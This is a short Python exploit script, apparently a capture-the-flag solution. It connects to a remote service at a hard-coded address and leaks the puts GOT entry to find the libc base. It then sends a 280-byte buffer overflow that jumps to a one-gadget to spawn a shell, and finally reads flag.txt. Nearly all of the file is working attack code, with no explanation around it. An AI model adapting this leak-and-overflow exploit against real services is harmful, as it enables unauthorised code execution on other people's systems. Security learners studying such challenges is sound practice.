import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 2123

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res.decode('ascii'))
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

puts_got      = 0x601018
puts_offset   = 0x6f690
# system_offset = 0x45390
gadget_offset = 0x45216

padding = b'A'*280

# Get libc base
recv()
send(hex(puts_got).encode('ascii'))
res = recv()
puts_adr = int(res[res.find(b'0x'):res.find(b'\n')], 16)
lib_base = puts_adr - puts_offset
# print(f'Libc base: {lib_base:#02x}')

# system_adr = lib_base + system_offset
gadget_adr = lib_base + gadget_offset
payload  = padding
payload += gadget_adr.to_bytes(8, 'little')
# payload += system_adr.to_bytes(8, 'little')
send(payload)

# interact()
send(b'cat flag.txt')
recv()
